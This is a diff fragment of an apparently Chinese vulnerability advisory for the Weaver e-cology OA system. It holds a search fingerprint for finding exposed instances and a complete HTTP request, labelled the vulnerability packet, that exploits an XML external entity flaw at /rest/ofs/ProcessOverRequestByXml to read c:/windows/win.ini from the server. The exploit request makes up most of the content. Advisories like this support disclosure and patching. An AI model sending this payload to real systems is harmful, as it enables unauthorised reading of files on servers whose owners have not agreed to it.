@@ -36,16 +36,16 @@ body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver"
   
 漏洞数据包：  
 ```
-POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: close
-Host: 127.0.0.1
-Content-Type: application/xml
-Content-Length: 146
+POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Host: 127.0.0.1
+Content-Type: application/xml
+Content-Length: 146
 
-<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
+<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPK8o0bbowreiacDhDbrpLia2dqOJ3icSmibMEapGjrHCTVRqo8xOIvAYoRA/640?wx_fmt=jpeg&from=appmsg "null")  
